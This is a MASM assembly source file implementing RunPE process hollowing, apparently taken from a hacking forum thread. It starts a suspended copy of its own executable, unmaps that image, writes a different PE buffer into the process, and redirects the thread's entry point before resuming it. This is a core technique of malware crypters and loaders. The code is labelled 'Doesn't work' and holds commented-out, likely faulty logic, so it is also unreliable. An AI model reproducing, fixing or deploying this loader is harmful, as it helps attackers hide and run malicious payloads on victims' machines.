;Doesn't work
;Source originally from: http://www.rohitab.com/discuss/topic/41336-masm-runpe-not-working/

fetch_headers PROC
 
    mov esi, buffer
    assume esi:ptr IMAGE_DOS_HEADER
    add esi, [esi].e_lfanew
    assume esi: ptr IMAGE_NT_HEADERS
    mov edi, esi
    add edi, sizeof IMAGE_NT_HEADERS
    assume edi: ptr IMAGE_SECTION_HEADER
 
    ret
fetch_headers ENDP
 
RunPE PROC
 
    LOCAL procInfo:PROCESS_INFORMATION
    LOCAL startInfo:STARTUPINFOA
    LOCAL ctx:CONTEXT
    LOCAL NtUnmapViewOfSection:DWORD
    LOCAL pImageBase:DWORD
 
    invoke fetch_headers
 
    invoke RtlZeroMemory, addr procInfo, sizeof procInfo
    invoke RtlZeroMemory, addr startInfo, sizeof startInfo
 
    invoke GetModuleFileName, 0, addr szCurrentPath, 1024
 
    invoke CreateProcess, addr szCurrentPath, 0, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, addr startInfo, addr procInfo
 
    invoke RtlZeroMemory, addr ctx, sizeof ctx
 
    mov [ctx].ContextFlags, CONTEXT_FULL
 
    invoke GetThreadContext, [procInfo].hThread, addr ctx
 
    mov eax, [ctx].regEbx
    add eax, 8
    invoke ReadProcessMemory, [procInfo].hProcess, eax, buffer, 4, NULL
 
    invoke LoadLibrary, chr$("ntdll.dll")
    invoke GetProcAddress, eax, chr$("NtUnmapViewOfSection")
    mov NtUnmapViewOfSection, eax
 
    push buffer
    push [procInfo].hProcess
    call NtUnmapViewOfSection
 
    invoke VirtualAllocEx, [procInfo].hProcess, [esi].OptionalHeader.ImageBase, [esi].OptionalHeader.SizeOfImage, 3000h, PAGE_EXECUTE_READWRITE
    mov pImageBase, eax
 
    invoke WriteProcessMemory, [procInfo].hProcess, pImageBase, buffer, [esi].OptionalHeader.SizeOfHeaders, NULL
 
    invoke fetch_headers
    xor ecx, ecx
    .repeat
        push ecx
         
        ;mov eax, 40
        ;imul ecx
 
        ;mov edi, esi
        ;add edi, 248
        ;add edi, eax
        ;add edi, sizeof IMAGE_NT_HEADERS
        ;assume edi: ptr IMAGE_SECTION_HEADER
 
        mov edx, [edi].VirtualAddress
        add edx, pImageBase
 
        mov ebx, [edi].PointerToRawData
        add ebx, buffer
 
        invoke WriteProcessMemory, [procInfo].hProcess, edx, ebx, [edi].SizeOfRawData, NULL
 
        pop ecx
         
        inc ecx
        add edi, sizeof IMAGE_SECTION_HEADER
    .until cx == [esi].FileHeader.NumberOfSections
 
    mov eax, [ctx].regEbx
    add eax, 8
    invoke WriteProcessMemory, [procInfo].hProcess, eax, [esi].OptionalHeader.ImageBase, 4, NULL
 
    mov eax, [esi].OptionalHeader.AddressOfEntryPoint
    add eax, pImageBase
    mov [ctx].regEax, eax
 
    invoke SetThreadContext, [procInfo].hThread, addr ctx
 
    invoke ResumeThread, [procInfo].hThread
 
 
    ret
RunPE ENDP
